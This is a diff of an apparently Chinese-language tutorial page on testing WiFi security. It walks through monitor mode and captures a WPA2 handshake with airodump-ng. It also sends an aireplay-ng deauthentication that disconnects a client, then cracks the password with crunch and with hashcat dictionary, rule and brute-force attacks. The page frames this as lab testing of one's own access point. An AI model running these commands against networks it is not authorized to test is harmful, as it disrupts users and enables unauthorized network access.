@@ -568,6 +568,11 @@ Supported interface modes:
 
 </code></pre>
 
+<p>扫描AP列表</p>
+
+<pre><code>nmcli device wifi list
+</code></pre>
+
 <p>再检查是否支持注入</p>
 
 <pre><code>sudo aireplay-ng --test wlan0
@@ -576,7 +581,7 @@ Supported interface modes:
 
 <p>USB 网卡脱离 NetworkManager</p>
 
-<pre><code>$sudo nmcli device set wlan1 managed no
+<pre><code>$sudo nmcli device set wlan0 managed no
 
 $nmcli device status
 DEVICE         TYPE      STATE                   CONNECTION
@@ -651,140 +656,121 @@ sudo airmon-ng start wlan0
 
 <pre><code>$sudo airodump-ng --bssid PC:DC:02:22:B3:78 -c 9 wlan0mon
 
-
-
-
-
 </code></pre>
 
-<p>c:&gt;netsh wlan show interfaces</p>
+<pre><code>c:\&gt;netsh wlan show interfaces
 
-<p>系统上有 1 个接口:</p>
+系统上有 1 个接口:
 
-<pre><code>名称                   : WLAN
-描述                   : Intel(R) Wireless-AC 9260 160MHz
-GUID                   : c0d229o0-e3a4-4677-8dfd-1x365b456392
-物理地址               : 7c:2m:7d:4p:87:cc
-状态                   : 已连接
-SSID                   : wubigo-5G
-BSSID                  : bc:8o:ba:f8:qa:bd
-网络类型               : 结构
-无线电类型             : 802.11ac
-身份验证               : WPA2 - 个人
-密码                   : CCMP
-连接模式               : 配置文件
-信道                   : 48
-接收速率(Mbps)         : 1733.3
-传输速率 (Mbps)        : 1733.3
-信号                   : 85%
-配置文件               : wubigo-5G
+    名称                   : WLAN
+    描述                   : Intel(R) Wireless-AC 9260 160MHz
+    GUID                   : c0d229o0-e3a4-4677-8dfd-1x365b456392
+    物理地址               : 7c:2m:7d:4p:87:cc
+    状态                   : 已连接
+    SSID                   : wubigo-5G
+    BSSID                  : bc:8o:ba:f8:qa:bd
+    网络类型               : 结构
+    无线电类型             : 802.11ac
+    身份验证               : WPA2 - 个人
+    密码                   : CCMP
+    连接模式               : 配置文件
+    信道                   : 48
+    接收速率(Mbps)         : 1733.3
+    传输速率 (Mbps)        : 1733.3
+    信号                   : 85%
+    配置文件               : wubigo-5G
 
-承载网络状态  : 不可用
+    承载网络状态  : 不可用
 </code></pre>
 
-<pre><code>
+<h2 id="建立一个安全的测试-ap">建立一个安全的测试 AP</h2>
 
-## 建立一个安全的测试 AP
+<p>找到测试 AP 的 BSSID</p>
 
-找到测试 AP 的 BSSID
-
-路由器在广播 Wi-Fi 信号（信标帧，Beacon Frame）时，SSID（网络名称）
+<p>路由器在广播 Wi-Fi 信号（信标帧，Beacon Frame）时，SSID（网络名称）
 和 BSSID（硬件 MAC 地址）都是明文公开广播的，不需要连接或验证密码即
-可扫描读取
+可扫描读取</p>
 
+<pre><code>$nmcli device wifi list
 
-</code></pre>
-
-<p>$nmcli device wifi list</p>
-
-<pre><code>SSID: Aircrack-Lab
-BSSID: bc:8o:ba:f8:qa:bd
-频道: 6
-</code></pre>
-
-<pre><code>
-## 在自己的 AP 上进行抓包验证
+    SSID: Aircrack-Lab
+    BSSID: bc:8o:ba:f8:qa:bd
+    频道: 6
 
 </code></pre>
 
-<p>sudo airodump-ng &ndash;bssid bc:8o:ba:f8:qa:bd &ndash;channel 6 &ndash;write lab_capture wlan1mon</p>
+<h2 id="在自己的-ap-上进行抓包验证">在自己的 AP 上进行抓包验证</h2>
 
-<pre><code>
-参数说明：
+<pre><code>sudo airodump-ng --bssid bc:8o:ba:f8:qa:bd -c 6 -w lab_capture wlan0mon
+</code></pre>
+
+<p>参数说明：
 - bssid：只监听你指定的测试 AP
 - channel：固定到测试 AP 所在频道
 - write lab_capture：将结果保存为 lab_capture-*
-- wlan1mon：Monitor Mode 接口
+- wlan0mon：Monitor Mode 接口</p>
 
-检查抓包文件
+<pre><code>sudo aireplay-ng --deauth 4 -a bc:8o:ba:f8:qa:bd -c YY:YY:YY:YY:YY:YY wlan0mon
+</code></pre>
+
+<p>检查抓包文件</p>
+
+<pre><code>ls -lh lab_capture*
+
+aircrack-ng lab_capture-01.cap
 
 </code></pre>
 
-<p>ls -lh lab_capture*</p>
+<h3 id="使用字典验证">使用字典验证</h3>
 
-<p>aircrack-ng lab_capture-01.cap</p>
+<ul>
+<li>kali自带字典</li>
+</ul>
 
-<pre><code>
-### 使用字典验证
+<p><code>/usr/share/wordlists/rockyou.txt.gz</code></p>
 
-- kali自带字典
+<ul>
+<li>使用crunch生成自定义字典</li>
+</ul>
 
-`/usr/share/wordlists/rockyou.txt.gz`
+<p>生成长度8位，包含数字和小写字母的所有组合</p>
 
-- 使用crunch生成自定义字典
-
-生成长度8位，包含数字和小写字母的所有组合
-
+<pre><code>$crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o custom-wordlist.txt
 </code></pre>
 
-<p>$crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o custom-wordlist.txt</p>
+<p>使用crunch管道输出到aircrack-ng（节省磁盘空间）</p>
 
-<pre><code>
-使用crunch管道输出到aircrack-ng（节省磁盘空间）
-
+<pre><code>$crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -w - -b bc:8o:ba:f8:qa:bd wpa2-crack-01.cap
 </code></pre>
 
-<p>$crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -w - -b bc:8o:ba:f8:qa:bd wpa2-crack-01.cap</p>
+<h3 id="使用hashcat加速">使用hashcat加速</h3>
 
-<pre><code>
-### 使用hashcat加速
+<p>与aircrack-ng使用CPU不同，hashcat可以利用GPU的并行计算能力，
+实现比CPU高数十甚至数百倍的破解速度</p>
 
-与aircrack-ng使用CPU不同，hashcat可以利用GPU的并行计算能力，
-实现比CPU高数十甚至数百倍的破解速度
+<p>将捕获文件转换为Hashcat格式</p>
 
-将捕获文件转换为Hashcat格式
-
+<pre><code># 方法1：使用aircrack-ng内置转换
+aircrack-ng wpa2-crack-01.cap -J wpa2-hashcat
+ 
+# 方法2：使用hccapx工具
+cap2hccapx wpa2-crack-01.cap wpa2-hccapx.hccapx
+ 
+# 方法3：使用hcxpcapngtool (推荐，更新)
+hcxpcapngtool -o wpa2-hashcat.hc22000 wpa2-crack-01.cap
 </code></pre>
 
-<h1 id="方法1-使用aircrack-ng内置转换">方法1：使用aircrack-ng内置转换</h1>
+<p>使用Hashcat破解WPA2</p>
 
-<p>aircrack-ng wpa2-crack-01.cap -J wpa2-hashcat</p>
-
-<h1 id="方法2-使用hccapx工具">方法2：使用hccapx工具</h1>
-
-<p>cap2hccapx wpa2-crack-01.cap wpa2-hccapx.hccapx</p>
-
-<h1 id="方法3-使用hcxpcapngtool-推荐-更新">方法3：使用hcxpcapngtool (推荐，更新)</h1>
-
-<p>hcxpcapngtool -o wpa2-hashcat.hc22000 wpa2-crack-01.cap</p>
-
-<pre><code>
-使用Hashcat破解WPA2
-
+<pre><code># 基本字典攻击
+hashcat -m 22000 -a 0 wpa2-hashcat.hc22000 /usr/share/wordlists/rockyou.txt
+ 
+# 字典 + 规则攻击（自动变换字典中的单词）
+hashcat -m 22000 -a 0 wpa2-hashcat.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+ 
+# 暴力破解（8位纯数字）
+hashcat -m 22000 -a 3 wpa2-hashcat.hc22000 ?d?d?d?d?d?d?d?d
 </code></pre>
-
-<h1 id="基本字典攻击">基本字典攻击</h1>
-
-<p>hashcat -m 22000 -a 0 wpa2-hashcat.hc22000 /usr/share/wordlists/rockyou.txt</p>
-
-<h1 id="字典-规则攻击-自动变换字典中的单词">字典 + 规则攻击（自动变换字典中的单词）</h1>
-
-<p>hashcat -m 22000 -a 0 wpa2-hashcat.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</p>
-
-<h1 id="暴力破解-8位纯数字">暴力破解（8位纯数字）</h1>
-
-<p>hashcat -m 22000 -a 3 wpa2-hashcat.hc22000 ?d?d?d?d?d?d?d?d
-```</p>
 
 <p>参数说明</p>
 
